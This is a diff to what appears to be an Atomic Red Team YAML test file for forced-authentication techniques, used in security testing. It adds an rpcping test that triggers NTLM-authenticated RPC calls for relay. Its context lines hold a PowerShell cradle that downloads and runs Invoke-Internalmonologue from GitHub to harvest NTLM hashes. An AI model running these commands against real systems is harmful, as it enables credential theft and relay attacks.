@@ -50,3 +50,24 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
       Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
     name: powershell
+
+- name: Trigger an authenticated RPC call to a target server with no Sign flag set
+  auto_generated_guid: 81cfdd7f-1f41-4cc5-9845-bb5149438e37
+  description: |-
+    RpcPing command can be used to trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign flag not Set)
+    Ref: https://twitter.com/splinter_code/status/1421144623678988298
+  supported_platforms:
+  - windows
+  input_arguments:
+    custom_port:
+      description: Specify the custom port number
+      type: integer
+      default: "9997"
+    server_ip:
+      description: Specify the server IP address. If not specified, the loop back IP will be used
+      type: string
+      default: 127.0.0.1
+  executor:
+    command: 'rpcping -s #{server_ip} -e #{custom_port} /a connect /u NTLM 1>$Null'
+    name: powershell
+    elevation_required: false
